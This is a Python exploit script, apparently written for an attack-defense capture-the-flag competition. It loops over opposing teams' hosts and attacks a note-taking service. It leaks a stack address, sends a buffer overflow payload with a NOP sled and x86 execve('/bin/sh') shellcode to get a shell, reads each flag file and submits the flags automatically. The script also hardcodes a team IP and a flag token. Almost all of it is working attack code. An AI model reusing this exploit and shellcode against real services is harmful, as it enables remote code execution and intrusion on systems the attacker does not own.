#!/usr/bin/env python3
import swpag_client
import pwn
import re
import time

TEAM_IP = "52.37.204.0"                             # Update according to team ip address
TEAM_FLAG_TOKEN = "ZOGR9UqlRWFg8wLJB3aj"            # Update according to team flag token
SERVICE_ID = 4                                      # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Bindevil"                      # Team name
EXCLUDE_HOSTNAME = "team19"                         # Team hostname
TEAM_URL = "http://" + TEAM_IP + "/"

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)    
    for target in team.get_targets(SERVICE_ID):
        hostname = target['hostname']
        flag_id = target['flag_id']
        port = target["port"]
        
        # Ignore our own team
        if target["team_name"] == EXCLUDE_TEAM_NAME or hostname == EXCLUDE_HOSTNAME:
            continue
        
        print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))
        
        try:
            r=pwn.remote(hostname, port)
            r.readuntil('id ')
            x = r.readuntil(')')
            x = x[0:10]
            print(x)
            pwn.enhex(x)
            try:
                x = int(x) - 36 - 88
                z = hex(x)
            except Exception as e:
                r.close()
                continue
            y = pwn.p32(x)
            print(y)
            r.recvuntil('Want to (R)ead or (W)rite a note?')
            r.send('R\n')
            r.recvuntil('password\n')
            shellcode='\x31\x20'
            shellcode+='\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43'
            shellcode+='\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43'
            shellcode+='\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43'
            shellcode+='\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43\x43'
            shellcode+='\x3c\x49\x83\xff'
            shellcode+='\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            shellcode+='\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            shellcode+='\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80'
            r.send('\n')
            r.write('12345')
            r.send('\n')
            shellcode = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
            shellcode+= 'h\x01\x01\x01\x01\x814$.ri\x01h/bin\x89\xe31\xc91\xd2j\x16X\xd1\xe8\xcd\x80'
            shellcode+= '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0g\xd2\xffDDDDDDDDDDDDDDDDDDDD'
            r.write((b'\x90'*20)+(b'\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x16\x58\xd1\xe8\xcd\x80')+(b'\x90'*30) + y +(b'\x44'*20))
            r.send('\n')
            r.send('\n')
            print(r.readuntil('password!'))
            r.send('\n')
            r.send('\n')
            r.send('cat '+flag_id+'\n')
            res = r.recvallS(timeout=3).strip("\r\n")
            r.close()
            print('**receive flag***************************************')
            print(res)
            FLAG_REGEX = (r'FLG[0-9A-Za-z]{13}')
            match = re.search(FLAG_REGEX, res)
            if match:
                result = team.submit_flag([match.group(0)])
                print(result)
        except Exception as e:
            print(e)
  except Exception as e:
    print(e)            
    time.sleep(60)
if __name__ == "__main__":
    while True:
        main()